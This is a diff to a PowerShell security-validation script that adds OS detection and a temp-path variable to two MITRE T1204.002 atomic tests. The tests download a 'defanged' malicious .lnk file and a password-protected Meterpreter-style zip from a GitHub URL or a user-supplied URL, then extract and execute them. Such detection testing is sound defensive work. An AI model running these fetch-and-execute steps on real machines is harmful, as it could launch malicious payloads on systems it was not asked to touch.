@@ -35,8 +35,36 @@ Security Validation Tests v0.1              @
 "@
 }
 
+function Get-OSType {
+    $unameOutput = $(uname -s)
+
+    if ($unameOutput -eq "Darwin") {
+        $os = "macOS"
+        $color = "Yellow"
+    } elseif ($unameOutput -eq "Linux") {
+        $os = "Linux"
+        $color = "Green"
+    } elseif ($unameOutput -eq "WindowsNT" -or $unameOutput -eq "MINGW32_NT-10.0" -or $unameOutput -eq "MINGW64_NT-10.0") {
+        $os = "Windows"
+        $color = "Cyan"
+    } else {
+        $os = "Unknown"
+        $color = "Red"
+    }
+
+    # Print the operating system with color and bold style
+    Write-Host -NoNewline "Operating System: " -ForegroundColor $color -BackgroundColor Black
+    Write-Host -NoNewline "$os" -ForegroundColor $color -BackgroundColor Black
+    Write-Host " (Selecting appropriate tests)"
+}
+
+
+
+
+
+
 # Function to run commands
-function Run-AtomicTest1 {
+function Run-AtomicTest1-Windows {
     Write-Host "
     Test 1: T1204.002 : User Execution: Defanged malicious .lnk file
     ------------------------------------
@@ -70,7 +98,7 @@ function Run-AtomicTest1 {
     
     try {
         # Try downloading the file from the first URL
-        Invoke-WebRequest -OutFile $env:Temp\test10.lnk $firstUrl -ErrorAction Stop
+        Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $firstUrl -ErrorAction Stop
         Write-Host "File downloaded successfully from $firstUrl"
     }
     catch {
@@ -80,7 +108,7 @@ function Run-AtomicTest1 {
         
         try {
             # Try downloading the file from the second URL
-            Invoke-WebRequest -OutFile $env:Temp\test10.lnk $secondUrl -ErrorAction Stop
+            Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $secondUrl -ErrorAction Stop
             Write-Host "File downloaded successfully from $secondUrl"
         }
         catch {
@@ -92,7 +120,7 @@ function Run-AtomicTest1 {
     }
 
     # The test file has been saved to $temp\test10.lnk
-    $file1 = "$env:Temp\test10.lnk"
+    $file1 = "$tempDirectory\test10.lnk"
 
     # Execute the downloaded file
     Start-Process $file1
@@ -104,13 +132,13 @@ function Run-AtomicTest1 {
     taskkill /IM a.exe /F
 
     # Removing all downloaded or created files
-    $file1 = "$env:Temp\test10.lnk"
-    $file2 = "$env:Temp\a.exe"
+    $file1 = "$tempDirectory\test10.lnk"
+    $file2 = "$tempDirectory\a.exe"
     Remove-Item $file1 -ErrorAction Ignore
     Remove-Item $file2 -ErrorAction Ignore
 }
 
-function Run-AtomicTest2 {
+function Run-AtomicTest2-Windows {
     Write-Host "
     Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter
     ------------------------------------
@@ -139,7 +167,7 @@ function Run-AtomicTest2 {
     "
     
     # First URL to download
-    $firstUrl = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/shell-trifident.zip"
+    $firstUrl = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/payloads/shell-trifident.zip"
     
     # Second URL to download (provide your own URL)
     $secondUrl = "YOUR_SECOND_URL_HERE"
@@ -152,7 +180,7 @@ function Run-AtomicTest2 {
     
     try {
         # Try downloading the file from the first URL
-        Invoke-WebRequest -OutFile $env:Temp\shell-trifident.zip $firstUrl -ErrorAction Stop
+        Invoke-WebRequest -OutFile $tempDirectory\shell-trifident.zip $firstUrl -ErrorAction Stop
         Write-Host "File downloaded successfully from $firstUrl"
     }
     catch {
@@ -162,14 +190,14 @@ function Run-AtomicTest2 {
         
         try {
             # Try downloading the file from the second URL
-            Invoke-WebRequest -OutFile $env:Temp\shell-trifident.zip $secondUrl -ErrorAction Stop
+            Invoke-WebRequest -OutFile $tempDirectory\shell-trifident.zip $secondUrl -ErrorAction Stop
             Write-Host "File downloaded successfully from $secondUrl"
         }
         catch {
             # If an error occurs again, display the error message and exit
             Write-Host "Error downloading file from $($secondUrl): $_"
             Write-Host "Failed to download the file from both URLs. Updating log information"
-            return
+            #return
         }
     }
 
@@ -188,18 +216,18 @@ function Run-AtomicTest2 {
 
     # If the module was installed or already installed, proceed with unzipping the file
     if ($Installed7Zip -or (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
-        $zipFile = "$env:Temp\shell-trifident.zip"
-        $destination = $env:Temp
+        $zipFile = "$tempDirectory/shell-trifident.zip"
+        $destination = $tempDirectory
         $password = "trifident"
         
         # Unzip the file using 7Zip4Powershell
-        Expand-7ZipArchive -ArchiveFileName $zipFile -Password $password -TargetPath $destination -Force
+        Expand-7Zip -ArchiveFileName $zipFile -Password $password -TargetPath $destination
     } else {
         Write-Host "Unable to unzip the file because the 7Zip4Powershell module is not available."
     }
     
     # The test file has been saved to $temp\shell.exe
-    $file1 = "$env:Temp\shell.exe"
+    $file1 = "$tempDirectory/shell.exe"
     # Execute the downloaded file
     Start-Process $file1
 
@@ -210,8 +238,8 @@ function Run-AtomicTest2 {
     taskkill /IM shell.exe /F
 
     # Removing all downloaded or created files
-    $file1 = "$env:Temp\shell-trifident.zip"
-    $file2 = "$env:Temp\shell.exe"
+    $file1 = "$tempDirectory\shell-trifident.zip"
+    $file2 = "$tempDirectory\shell.exe"
     Remove-Item $file1 -ErrorAction Ignore
     Remove-Item $file2 -ErrorAction Ignore
 
@@ -219,5 +247,8 @@ function Run-AtomicTest2 {
 
 # Call the function to display the logo and begin tests
 Show-Logo
-Run-AtomicTest1
-Run-AtomicTest2
+Get-OSType
+# Get the temporary directory path
+$tempDirectory = [System.IO.Path]::GetTempPath()
+Run-AtomicTest1-Windows
+Run-AtomicTest2-Windows
